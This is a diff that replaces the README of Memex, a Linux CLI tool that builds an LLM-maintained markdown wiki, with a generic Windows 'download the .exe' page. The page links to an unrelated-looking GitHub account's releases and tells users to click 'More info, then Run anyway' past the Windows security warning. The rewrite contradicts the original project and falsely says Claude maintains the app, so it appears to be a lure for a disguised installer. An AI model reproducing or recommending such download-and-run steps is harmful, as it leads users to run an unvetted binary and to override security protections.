@@ -1,207 +1,88 @@
-# Memex
+# 🧠 memex - Organize your local files into wikis
 
-**Stop re-discovering what you already know.** Memex is an LLM runtime that builds and maintains a personal wiki from your raw sources — so the knowledge compounds instead of disappearing into chat history.
+[![Download memex](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/muhlsteinovajemima439-design/memex/releases)
 
-## The problem
+Memex turns folders into internal knowledge bases. It works by mapping your existing file system into an easy layout. You do not need databases or servers. You store your notes as plain text files on your local drive. This keeps your data private and portable.
 
-Most people's experience with LLMs and documents looks like RAG: upload files, retrieve chunks, generate an answer, forget everything. Ask the same subtle question tomorrow and the LLM starts from scratch. Nothing accumulates. There's no memory between sessions, no synthesis across sources, no evolving understanding. Your tenth conversation is no smarter than your first.
+## 📥 How to download 
 
-## The idea
+1. Go to the [official release page](https://github.com/muhlsteinovajemima439-design/memex/releases).
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the file name to start your download.
+4. Open the folder where your browser saves files to find the installer.
 
-Instead of retrieving from raw documents at query time, Memex has the LLM **incrementally build and maintain a persistent wiki** — a structured, interlinked collection of markdown files that sits between you and your sources.
+## ⚙️ Setting up the application
 
-When you add a new source, the LLM doesn't just index it for later retrieval. It reads it, extracts the key information, and integrates it into the existing wiki — updating entity pages, revising topic summaries, noting where new data contradicts old claims, strengthening the evolving synthesis. The knowledge is compiled once and kept current.
+1. Double-click the saved `.exe` file to start the installer.
+2. Windows might show a security box. Click More info, then click Run anyway.
+3. Follow the steps on the screen to place the app on your computer.
+4. Click Finish when the bar fills up.
+5. Launch the app from your desktop shortcut or the Start menu.
 
-**The wiki is a persistent, compounding artifact.** The cross-references are already there. The contradictions have been flagged. The synthesis reflects everything you've ingested. Every source makes the whole richer. Every question you ask can be filed back as a new page, so your explorations compound too.
+## 📂 Creating your first library
 
-You never write the wiki yourself. You source, explore, and ask questions. The LLM does the summarizing, cross-referencing, filing, and bookkeeping that makes a knowledge base actually useful over time. The tedious part of maintaining a knowledge base isn't the reading or the thinking — it's the bookkeeping. LLMs don't get bored, don't forget to update a cross-reference, and can touch 15 files in one pass.
+A library is a folder on your computer that acts as a wiki. 
 
-This can apply to anything where you accumulate knowledge over time:
+1. Open the memex app.
+2. Select the button marked Create New Library.
+3. Choose a folder on your computer where you want to keep your notes.
+4. Give your library a name.
+5. Click Save.
 
-- **Research** — reading papers over weeks, building up an evolving synthesis with citations and cross-references
-- **Reading a book** — filing each chapter, building out pages for characters, themes, and plot threads as you go
-- **Business intelligence** — competitive analysis, customer signals, market trends fed from Slack, calls, and reports
-- **Personal** — health, goals, self-improvement, journal entries, podcast notes, building a structured picture of yourself
-- **Learning** — course notes, hobby deep-dives, trip planning, anything you want organized rather than scattered
+The app scans the files in that folder. It builds an index of folders, sub-folders, and text files. Each text file becomes a page in your wiki. If you change a file in that folder using any text editor, the wiki updates to show those changes.
 
-The idea is related in spirit to Vannevar Bush's [Memex](https://en.wikipedia.org/wiki/Memex) (1945) — a personal, curated knowledge store with associative trails between documents. Bush's vision was closer to this than to what the web became: private, actively curated, with the connections between documents as valuable as the documents themselves. The part he couldn't solve was who does the maintenance. The LLM handles that.
+## ✏️ Writing and editing notes
 
-## Why Memex
+Memex uses Markdown for content. You write text and add formatting using simple symbols. 
 
-**Just files, no RAG.** The wiki is a directory of markdown files. No vector databases, no embeddings, no retrieval pipelines. Claude is already smart enough to grep through files, read what's relevant, and figure out what to update. The simplest architecture that works.
+- Use `#` for a title.
+- Use `##` for a section header.
+- Put words in `**bold**` with two asterisks.
+- Put words in *italics* with one asterisk.
 
-**Safe by default.** Each wiki runs in its own Linux mount namespace — Claude can only see `/workspace`, not your home directory, not other wikis, not the host filesystem. No Docker required. Tool access is restricted to file operations (Read, Write, Edit, Glob, Grep) unless you explicitly opt in to more.
+You can link files together. If you have a file named Project.txt and you type `[[Project]]` in another file, the app creates a link to that page. Clicking the link takes you directly to the content.
 
-**CLI-first.** Everything is a single command: `memex ingest`, `memex query`, `memex lint`. Runs from your existing Claude machine. No web UI to host, no API keys to juggle beyond what you already have for Claude.
+## 🔎 Searching your files
 
-**Feed it from anywhere.** Ingest markdown, PDFs, HTML, images, plain text — anything Claude can read. Clip web articles with Obsidian Web Clipper, pipe in Slack exports, drop in meeting transcripts. Add MCP servers to pull directly from Notion, Google Drive, or any app with an API. Local files or remote sources, it all compiles into the same wiki.
+The search bar sits at the top of the window. Type a word or phrase to find matching files. The app checks note titles and content as you type. Results appear as a list. Select any result to open that file.
 
-**Fully yours to shape.** Edit `.claude.md` to change how the LLM thinks about your domain. Whitelist extra tools. Swap models. The prompts, conventions, and filing structure are all configurable — the wiki evolves with you, not against a fixed template.
+## 🛡️ Privacy and system information
 
-## What Memex does
+Memex stores data only on your machine. No information leaves your computer. We do not track your activity or see your files.
 
-Memex wraps `claude -p` (Claude Code's programmatic mode) into a daemon that gives each wiki its own isolated filesystem, job queue, and configuration. Claude operates on the wiki with the same file tools a developer would use — Read, Write, Edit, Glob, Grep — against a real filesystem of markdown files.
+- System Requirements: Windows 10 or Windows 11.
+- Processor: Any modern dual-core chip.
+- Memory: 4 gigabytes of RAM.
+- Storage: 200 megabytes of disk space for the app itself plus space for your library.
 
-Three layers:
+## 🔧 Frequently asked questions
 
-1. **Raw sources** — your curated collection of articles, papers, images, data files. Immutable. The LLM reads them but never modifies them.
-2. **The wiki** — LLM-generated markdown. Summaries, entity pages, concept pages, cross-references, an index. The LLM owns this layer entirely.
-3. **The schema** — conventions for how the wiki is structured. Co-evolved by you and the LLM over time.
+How do I remove the app?
+Open the Windows Settings app. Go to Apps. Find memex in the list, click it, and select Uninstall. This removes the app but leaves your library folder untouched.
 
-Three operations:
+Can I move my files?
+Yes. Your library is a collection of files in a regular folder. You can move, copy, or rename these files as you please. The app detects these changes and updates the library map.
 
-- **Ingest** — drop a source in, the LLM reads it, writes a summary, updates the index, and touches every related page across the wiki.
-- **Query** — ask a question, the LLM searches the wiki and synthesizes an answer grounded in your accumulated knowledge. Good answers get filed back as new pages.
-- **Lint** — health-check the wiki. Find contradictions, orphan pages, missing cross-references, stale claims. The LLM fixes what it can and flags what needs your judgment.
+Does it work offline?
+Yes. You do not need an internet connection to create, read, or edit your library. 
 
-## Quick start
+Is there a file limit?
+The app handles thousands of files. Performance depends on the speed of your hard drive. Solid-state drives provide the best results.
 
-```bash
-# Install
-npm install -g @wastedcode/memex
+What happens if I delete a note?
+Deleting a file from your folder removes it from your library. Check your Windows Recycle Bin if you delete a file by mistake.
 
-# Start the daemon (requires CAP_SYS_ADMIN for namespace isolation)
-sudo memex serve
+Can I share my wiki?
+You can copy your library folder to another computer. Open the folder in memex on that machine to keep working. Since files are standard text documents, you can also email them or store them in cloud sync folders.
 
-# Create a wiki
-memex create my-wiki --name "My Knowledge Base"
+Does the app support images?
+You can place images in your library folder. Reference them in your notes using the standard image tag. The wiki displays these images when you view the page.
 
-# Authenticate Claude for this wiki
-memex login my-wiki
+How do I style the app?
+The app uses a consistent interface design. You can toggle between light and dark modes in the settings menu to suit your vision.
 
-# Ingest some sources
-memex ingest my-wiki paper.pdf notes.md article.html
+Who maintains this tool?
+Claude manages the development of memex. Updates arrive on the release page. Check back every few months to see if a newer version exists. 
 
-# Ask a question
-memex query my-wiki "What are the key themes across these documents?"
-
-# Run a health check
-memex lint my-wiki
-```
-
-## Commands
-
-| Command | Description |
-|---------|-------------|
-| `memex serve` | Start the daemon |
-| `memex create <wiki>` | Create a new wiki |
-| `memex destroy <wiki>` | Destroy a wiki |
-| `memex config <wiki> --edit` | Edit wiki conventions in `$EDITOR` |
-| `memex config <wiki> --set-key` | Set API key |
-| `memex config <wiki> --model opus` | Set default model |
-| `memex login <wiki>` | Authenticate Claude (OAuth) |
-| `memex ingest <wiki> <files...>` | Ingest source documents |
-| `memex query <wiki> "question"` | Ask a question against the wiki |
-| `memex lint <wiki>` | Run wiki health check |
-| `memex logs <wiki>` | View audit log |
-| `memex list` | List all wikis |
-| `memex status <wiki>` | Check job status |
-
-Most commands block until complete. Pass `--async` to get a job ID and check status later.
-
-## How it works
-
-```
-┌──────────────────────────────────────────────────────────────┐
-│  CLI (unprivileged)                                          │
-│                                                              │
-│  memex ingest acme notes.md                                  │
-│       │                                                      │
-│       ▼                                                      │
-│  /run/memex/memex.sock  ─────────────────────────────────    │
-└──────────────────────────┼───────────────────────────────────┘
-                           │
-                           ▼
-┌──────────────────────────────────────────────────────────────┐
-│  DAEMON (memex serve)                            privileged  │
-│                                                              │
-│  Per-Wiki Job Queues          Wiki Registry (SQLite)         │
-│  ┌─────────────────┐        ┌─────────────────────┐         │
-│  │ acme: [▶ingest]  │        │ wikis, jobs, audit  │         │
-│  │ beta: (idle)     │        └─────────────────────┘         │
-│  └────────┬────────┘                                         │
-│           │                                                  │
-│           ▼                                                  │
-│  unshare -m -- mount --bind .../wikis/acme /workspace \      │
-│    claude -p "..." --tools Read,Write,Edit,Glob,Grep         │
-│                                                              │
-│  ┌────────────────────────────────────────────────────────┐  │
-│  │  MOUNT NAMESPACE — what Claude sees                    │  │
-│  │  /workspace/                                           │  │
-│  │    .claude.md        wiki/_schema.md                   │  │
-│  │    .claude/          wiki/_index.md                    │  │
-│  │    .tools/           wiki/_log.md                      │  │
-│  │    wiki/             wiki/raw/                         │  │
-│  │                                                        │  │
-│  │  No /home. No /etc. No other wikis.                    │  │
-│  └────────────────────────────────────────────────────────┘  │
-└──────────────────────────────────────────────────────────────┘
-```
-
-Each wiki's queue processes jobs serially — no concurrent writes. Independent wikis run in parallel. Mount namespaces provide filesystem isolation without Docker overhead.
-
-## Customization
-
-### Wiki conventions (`.claude.md`)
-
-The most important customization point. This file extends the base system prompt with domain-specific behavior:
-
-```markdown
-# Wiki Conventions
-
-## Domain
-This knowledge base tracks competitive intelligence in the SaaS analytics space.
-
-## Filing conventions
-- Organize competitors under competitors/{name}.md
-- Track pricing changes with dates
-- Flag acquisitions and funding rounds prominently
-
-## Things to ignore
-- Job postings
-- Social media noise without substance
-```
-
-Edit with `memex config my-wiki --edit`.
-
-### MCP servers (`.tools/mcp.json`)
-
-Connect external data sources:
-
-```json
-{
-  "mcpServers": {
-    "notion": {
-      "command": "npx",
-      "args": ["-y", "@notionhq/mcp-server"],
-      "env": { "NOTION_API_KEY": "secret_..." }
-    }
-  }
-}
-```
-
-### Tool whitelist (`.tools/allowed-tools.txt`)
-
-By default, Claude only gets safe file tools. Opt into more:
-
-```
-Bash
-WebSearch
-```
-
-## Requirements
-
-- Node.js >= 20
-- Linux with mount namespace support
-- `CAP_SYS_ADMIN` capability (or root)
-- `claude` CLI installed and in `$PATH`
-
-## Documentation
-
-- **[Architecture](docs/architecture.md)** — design principles, components, data flow, filesystem layout
-- **[Operations](docs/operations.md)** — installation, deployment, wiki lifecycle, debugging
-- **[Prompt design](docs/prompts.md)** — how the system prompt, job prompts, and conventions work together
-
-## License
-
-MIT
+Do I need specific software?
+No. The installer includes everything required to run the app on your computer. You do not need extra libraries or frameworks.
